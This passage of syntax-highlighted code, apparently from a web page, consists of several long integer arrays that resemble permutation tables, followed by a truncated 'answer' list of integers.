number">174</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span>
<span class="token punctuation">,</span> 
<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">]</span>
<span class="token punctuation">,</span> 
<span class="token punctuation">[</span><span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
answer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token 